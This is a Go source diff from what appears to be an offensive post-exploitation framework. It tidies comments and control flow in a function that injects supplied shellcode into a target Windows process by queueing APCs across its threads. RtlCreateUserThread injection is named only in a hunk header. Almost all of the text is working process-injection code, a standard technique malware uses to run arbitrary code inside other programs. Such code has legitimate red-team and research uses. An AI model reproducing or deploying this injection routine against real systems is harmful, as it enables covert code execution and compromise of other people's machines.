@@ -35,21 +35,37 @@ import (
 )
 
 const (
+	// MEM_COMMIT is a Windows constant used with Windows API calls
 	MEM_COMMIT             	= 0x1000
+	// MEM_RESERVE is a Windows constant used with Windows API calls
 	MEM_RESERVE            	= 0x2000
+	// MEM_RELEASE is a Windows constant used with Windows API calls
 	MEM_RELEASE 			= 0x8000
+	// PAGE_EXECUTE is a Windows constant used with Windows API calls
 	PAGE_EXECUTE 			= 0x10
+	// PAGE_EXECUTE_READWRITE is a Windows constant used with Windows API calls
 	PAGE_EXECUTE_READWRITE 	= 0x40
+	// PAGE_READWRITE is a Windows constant used with Windows API calls
 	PAGE_READWRITE 			= 0x04
+	// PROCESS_CREATE_THREAD is a Windows constant used with Windows API calls
 	PROCESS_CREATE_THREAD 	= 0x0002
+	// PROCESS_VM_READ is a Windows constant used with Windows API calls
 	PROCESS_VM_READ 		= 0x0010
+	//PROCESS_VM_WRITE is a Windows constant used with Windows API calls
 	PROCESS_VM_WRITE 		= 0x0020
+	// PROCESS_VM_OPERATION is a Windows constant used with Windows API calls
 	PROCESS_VM_OPERATION 	= 0x0008
+	// PROCESS_QUERY_INFORMATION is a Windows constant used with Windows API calls
 	PROCESS_QUERY_INFORMATION = 0x0400
+	// TH32CS_SNAPHEAPLIST is a Windows constant used with Windows API calls
 	TH32CS_SNAPHEAPLIST		= 0x00000001
+	// TH32CS_SNAPMODULE is a Windows constant used with Windows API calls
 	TH32CS_SNAPMODULE		= 0x00000008
+	// TH32CS_SNAPPROCESS is a Windows constant used with Windows API calls
 	TH32CS_SNAPPROCESS		= 0x00000002
+	// TH32CS_SNAPTHREAD is a Windows constant used with Windows API calls
 	TH32CS_SNAPTHREAD		= 0x00000004
+	// THREAD_SET_CONTEXT is a Windows constant used with Windows API calls
 	THREAD_SET_CONTEXT 		= 0x0010
 )
 
@@ -242,6 +258,7 @@ func ExecuteShellcodeRtlCreateUserThread(shellcode []byte, pid uint32) error {
 	return nil
 }
 
+// ExecuteShellcodeQueueUserAPC executes provided shellcode in the provided target process using the Windows QueueUserAPC API call
 func ExecuteShellcodeQueueUserAPC(shellcode []byte, pid uint32) error {
 	// TODO this can be local or remote
 	kernel32 := windows.NewLazySystemDLL("kernel32")
@@ -307,45 +324,42 @@ func ExecuteShellcodeQueueUserAPC(shellcode []byte, pid uint32) error {
 	_, _, errThread32First := Thread32First.Call(uintptr(sHandle), uintptr(unsafe.Pointer(&t)))
 	if errThread32First.Error() != "The operation completed successfully."{
 		return errors.New("Error calling Thread32First:\r\n" + errThread32First.Error())
-	} else {
-		i := true
-		x := 0
-		// Queue an APC for every thread; very unstable and not ideal, need to programmatically find alertable thread
-		for i {
-			_, _, errThread32Next := Thread32Next.Call(uintptr(sHandle), uintptr(unsafe.Pointer(&t)))
-			if errThread32Next.Error() == "There are no more files." {
-				if x == 1 {
-					// don't queue to main thread when using the "spray all threads" technique
-					// often crashes process
-					return errors.New("the process only has 1 thread; APC not queued")
-				}
-				i = false
-				break
-			} else if errThread32Next.Error() != "The operation completed successfully." {
-				return errors.New("Error calling Thread32Next:\r\n" + errThread32Next.Error())
+	}
+	i := true
+	x := 0
+	// Queue an APC for every thread; very unstable and not ideal, need to programmatically find alertable thread
+	for i {
+		_, _, errThread32Next := Thread32Next.Call(uintptr(sHandle), uintptr(unsafe.Pointer(&t)))
+		if errThread32Next.Error() == "There are no more files." {
+			if x == 1 {
+				// don't queue to main thread when using the "spray all threads" technique
+				// often crashes process
+				return errors.New("the process only has 1 thread; APC not queued")
 			}
-			if t.th32OwnerProcessID == pid {
-				if x > 0 {
-					tHandle, _, errOpenThread := OpenThread.Call(THREAD_SET_CONTEXT, 0, uintptr(t.th32ThreadID))
-					if errOpenThread.Error() != "The operation completed successfully." {
-						return errors.New("Error calling OpenThread:\r\n" + errOpenThread.Error())
-					} else {
-						// fmt.Println(fmt.Sprintf("Queueing APC for PID: %d, Thread %d", pid, t.th32ThreadID))
-						_, _, errQueueUserAPC := QueueUserAPC.Call(addr, tHandle, 0)
-						if errQueueUserAPC.Error() != "The operation completed successfully." {
-							return errors.New("Error calling QueueUserAPC:\r\n" + errQueueUserAPC.Error())
-						} else {
-							x++
-							_, _, errCloseHandle := CloseHandle.Call(tHandle)
-							if errCloseHandle.Error() != "The operation completed successfully." {
-								return errors.New("Error calling thread CloseHandle:\r\n" + errCloseHandle.Error())
-							}
-						}
-					}
-				} else {x++}
-			}
-
+			i = false
+			break
+		} else if errThread32Next.Error() != "The operation completed successfully." {
+			return errors.New("Error calling Thread32Next:\r\n" + errThread32Next.Error())
 		}
+		if t.th32OwnerProcessID == pid {
+			if x > 0 {
+				tHandle, _, errOpenThread := OpenThread.Call(THREAD_SET_CONTEXT, 0, uintptr(t.th32ThreadID))
+				if errOpenThread.Error() != "The operation completed successfully." {
+					return errors.New("Error calling OpenThread:\r\n" + errOpenThread.Error())
+				}
+				// fmt.Println(fmt.Sprintf("Queueing APC for PID: %d, Thread %d", pid, t.th32ThreadID))
+				_, _, errQueueUserAPC := QueueUserAPC.Call(addr, tHandle, 0)
+				if errQueueUserAPC.Error() != "The operation completed successfully." {
+					return errors.New("Error calling QueueUserAPC:\r\n" + errQueueUserAPC.Error())
+				}
+				x++
+				_, _, errCloseHandle := CloseHandle.Call(tHandle)
+				if errCloseHandle.Error() != "The operation completed successfully." {
+					return errors.New("Error calling thread CloseHandle:\r\n" + errCloseHandle.Error())
+				}
+			} else {x++}
+		}
+
 	}
 	// TODO check process to make sure it didn't crash
 	_, _, errCloseHandle := CloseHandle.Call(uintptr(pHandle))
